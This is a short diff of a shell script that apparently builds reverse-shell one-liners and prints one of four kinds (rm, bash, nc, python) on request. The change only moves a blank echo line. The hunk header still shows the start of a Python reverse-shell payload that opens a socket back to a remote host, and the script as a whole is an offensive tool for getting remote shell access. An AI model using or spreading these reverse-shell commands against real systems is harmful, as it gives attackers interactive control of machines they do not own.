@@ -29,23 +29,20 @@ python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,so
 
 #Display of the reverse shell
 
+echo ""
 
 if [ "$reverse" = "rm" ]; then
-echo ""
 echo $rm
 fi
 
 if [ "$reverse" = "bash" ]; then
-echo ""
 echo $bash
 fi
 
 if [ "$reverse" = "nc" ]; then
-echo ""
 echo $nc
 fi
 
 if [ "$reverse" = "python" ]; then
-echo ""
 echo $python
 fi
